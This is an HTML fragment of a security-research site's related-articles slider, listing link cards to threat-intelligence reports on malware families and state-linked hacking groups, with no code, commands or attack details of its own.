					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:Python">Python</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/" title="Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider"  data-card-link="https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/" data-video-cta-tracking="molerats-delivers-spark-backdoor:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:card:video-modal:Read the article" data-video-title="Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning">
              <div class="card-media has-video" data-video="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922.jpg">
                              <figure>
                <img width="718" height="440" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-718x440.jpg" class="attachment-medium size-medium" alt="A pictorial representation of machine learning detecting vulnerability scanning. A Black man using a tablet with a background of illuminated city buildings at night." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-718x440.jpg 718w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-1143x700.jpg 1143w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-768x470.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922.jpg 1505w" sizes="(max-width: 718px) 100vw, 718px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning">
                    <h4 class="post-title">Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/machine-learning/" title="Machine Learning" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:Machine Learning">Machine Learning</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/" title="Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of keylogger malware like KLogEXE and FPSpy. Person working on a laptop with lines of code displayed on the screen, with a blurred effect indicating motion or activity, surrounded by a vivid blue and red lighting." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/kimsuky-new-keylogger-backdoor-variant/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy">
                    <h4 class="post-title">Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/mitre/" title="MITRE" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:MITRE">MITRE</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/keylogger/" title="Keylogger" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:Keylogger">Keylogger</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:North Korea">North Korea</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/kimsuky-new-keylogger-backdoor-variant/" title="Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of SnipBot. Digital abstract background featuring binary code and technology symbols with a blue glow in the shape of a skull." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Inside SnipBot: The Latest RomCom Malware Variant">
                    <h4 class="post-title">Inside SnipBot: The Latest RomCom Malware Variant</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/backdoor/" title="backdoor" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:backdoor">Backdoor</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/romcom/" title="RomCom" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:RomCom">RomCom</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" title="Inside SnipBot: The Latest RomCom Malware Variant" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="A pictorial representation of a red team tool like Splinter. A digital illustration showing a 3D brain model surrounded by rising data columns on a circuit board, representing advanced artificial intelligence technology." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/analysis-pentest-tool-splinter/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool">
                    <h4 class="post-title">Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/red-teaming-tool/" title="red teaming tool" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:red teaming tool">Red teaming tool</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/pentest-tool/" title="pentest tool" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:pentest tool">Pentest tool</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/analysis-pentest-tool-splinter/" title="Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-786x368.png" class="attachment-medium size-medium" alt="Pictorial representation of APT groups from North Korea. The silhouette of two fish and the Pisces constellation inside an orange abstract planet, surrounded by two larger blue fish. Abstract, stylized cosmic setting with vibrant blue and purple shapes, representing space and distant planetary bodies." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/gleaming-pisces-applejeus-poolrat-and-pondrat/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors">
                    <h4 class="post-title">Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:Python">Python</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/cryptocurrency/" title="Cryptocurrency" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:Cryptocurrency">Cryptocurrency</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:North Korea">North Korea</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/gleaming-pisces-applejeus-poolrat-and-pondrat/" title="Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-786x368.png" class="attachment-medium size-medium" alt="Illustrative image featuring two fish and the Pisces constellation superimposed on a stylized, abstract background with flowing purple waves and a starry night sky." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Threat Assessment: North Korean Threat Groups:High Profile Threats"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/top-threats.svg" alt=" category icon">High Profile Threats</span></a>                  <a href="https://unit42.paloaltonetworks.com/threat-assessment-north-korean-threat-groups-2024/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Threat Assessment: North Korean Threat Groups">
                    <h4 class="post-title">Threat Assessment: North Korean Threat Groups</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Threat Assessment: North Korean Threat Groups:North Korea">North Korea</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remote-access-trojan/" title="Remote Access Trojan" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Threat Assessment: North Korean Threat Groups:Remote Access Trojan">Remote Access Trojan</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/finance/" title="Finance" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Threat Assessment: North Korean Threat Groups:Finance">Finance</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/threat-assessment-north-korean-threat-groups-2024/" title="Threat Assessment: North Korean Threat Groups" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Threat Assessment: North Korean Threat Groups:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-786x368.png" class="attachment-medium size-medium" alt="Pictorial representation of Stately Taurus&#039; updated TTPs. Illustration of a bull&#039;s head and the Taurus constellation inside a stylized orange moon, set against the profile of a much larger bull&#039;s head. Shooting stars are on the dark background." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Chinese APT Abuses VSCode to Target Government in Asia">
                    <h4 class="post-title">Chinese APT Abuses VSCode to Target Government in Asia</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/dll-sideloading/" title="DLL Sideloading" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:DLL Sideloading">DLL Sideloading</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/advanced-persistent-threat/" title="Advanced Persistent Threat" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:Advanced Persistent Threat">Advanced Persistent Threat</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/china/" title="China" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:China">China</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" title="Chinese APT Abuses VSCode to Target Government in Asia" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of malware such as WikiLoader. Red and blue digital data flowing from microchips on a circuit board, representing high-tech computing." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/global-protect-vpn-spoof-distributes-wikiloader/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant">
                    <h4 class="post-title">Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/malvertising/" title="malvertising" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:malvertising">Malvertising</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/dll-sideloading/" title="DLL Sideloading" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:DLL Sideloading">DLL Sideloading</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/global-protect-vpn-spoof-distributes-wikiloader/" title="Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-786x368.png" class="attachment-medium size-medium" alt="Pictorial representation of APT Fighting Ursa. The silhouette of a bear and the Ursa constellation inside an orange abstract planet. Abstract, stylized cosmic setting with vibrant blue and purple claw marks, representing space and distant planetary bodies." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Fighting Ursa Luring Targets With Car for Sale:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/fighting-ursa-car-for-sale-phishing-lure/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Fighting Ursa Luring Targets With Car for Sale">
                    <h4 class="post-title">Fighting Ursa Luring Targets With Car for Sale</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/advanced-persistent-threat/" title="Advanced Persistent Threat" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Fighting Ursa Luring Targets With Car for Sale:Advanced Persistent Threat">Advanced Persistent Threat</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/apt28/" title="APT28" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Fighting Ursa Luring Targets With Car for Sale:APT28">APT28</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/fancy-bear/" title="Fancy Bear" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Fighting Ursa Luring Targets With Car for Sale:Fancy Bear">Fancy Bear</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/fighting-ursa-car-for-sale-phishing-lure/" title="Fighting Ursa Luring Targets With Car for Sale" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Fighting Ursa Luring Targets With Car for Sale:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                    </div>
    </div>
    <div class="l-container bs__controls">
      <div class="bs__progress"><span></span></div>
      <div class="bs__navigation"> 
        <ul>
          <li> 
            <button id="prevButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
          <li> 
            <button id="nextButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
        </ul>
      </div>
    </div>
  </div>
 
        <div class="be-enlarge-modal" id="enlargedModal">
          <div class="be-enlarge-modal__wrapper"> 
            <figure> 
              <button class="close__modal" id="closeModal"> 
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button"></button>
              <img class="be__enlarged-image" id="enlargedImage" src="" alt="Enlarged Image">
              <figcaption> </figcaption>
